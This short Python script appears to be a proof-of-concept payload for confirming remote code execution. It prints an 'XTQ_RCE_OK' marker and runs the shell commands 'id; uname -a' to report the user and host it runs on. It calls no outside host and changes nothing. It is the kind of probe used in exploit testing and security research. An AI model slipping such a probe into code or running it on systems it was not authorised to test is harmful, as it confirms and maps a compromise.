import os, socket, subprocess, sys
print("XTQ_RCE_OK", flush=True)
try:
    print(subprocess.check_output("id; uname -a; echo XTQ_RCE_HOST", shell=True).decode(), flush=True)
except Exception as e:
    print("exec_err", e, flush=True)
